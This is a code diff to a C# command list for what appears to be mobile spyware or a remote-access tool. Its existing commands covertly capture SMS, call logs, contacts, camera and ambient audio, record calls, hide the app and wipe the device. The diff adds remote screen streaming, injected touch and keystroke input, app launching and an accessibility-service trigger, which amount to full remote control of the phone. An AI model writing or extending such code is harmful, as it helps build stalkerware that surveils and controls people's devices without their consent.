@@ -47,12 +47,23 @@ public static class CommandTypes
     public const string UpdateInterval = "update_interval";
     public const string RestartService = "restart_service";
     public const string Uninstall = "uninstall";
+    public const string ScreenCapture = "screen_capture";
+    public const string ScreenStreamStart = "screen_stream_start";
+    public const string ScreenStreamStop = "screen_stream_stop";
+    public const string TouchTap = "touch_tap";
+    public const string TouchSwipe = "touch_swipe";
+    public const string TouchType = "touch_type";
+    public const string OpenApp = "open_app";
+    public const string KeyPress = "key_press";
+    public const string StartAccessibility = "start_accessibility";
 
     public static readonly HashSet<string> All = new()
     {
         SyncNow, CaptureLocation, CaptureCallLogs, CaptureSms, CaptureContacts,
         CaptureApps, CaptureScreenshot, CaptureCamera, RecordAmbient, RecordCall,
         LockDevice, WipeDevice, HideApp, UnhideApp, EnableAdmin, DisableAdmin,
-        PlaySound, SendAlert, UpdateInterval, RestartService, Uninstall
+        PlaySound, SendAlert, UpdateInterval, RestartService, Uninstall,
+        ScreenCapture, ScreenStreamStart, ScreenStreamStop,
+        TouchTap, TouchSwipe, TouchType, OpenApp, KeyPress, StartAccessibility
     };
 }
